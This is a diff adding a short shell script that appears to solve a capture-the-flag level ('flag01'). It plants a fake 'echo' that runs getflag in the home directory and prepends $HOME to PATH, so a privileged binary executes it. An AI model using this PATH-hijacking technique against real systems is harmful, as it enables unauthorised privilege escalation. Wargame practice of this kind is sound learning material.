@@ -1,0 +1,4 @@
+echo "getflag" > ~/echo
+chmod +x ~/echo
+PATH="$HOME:$PATH" ./flag01
+
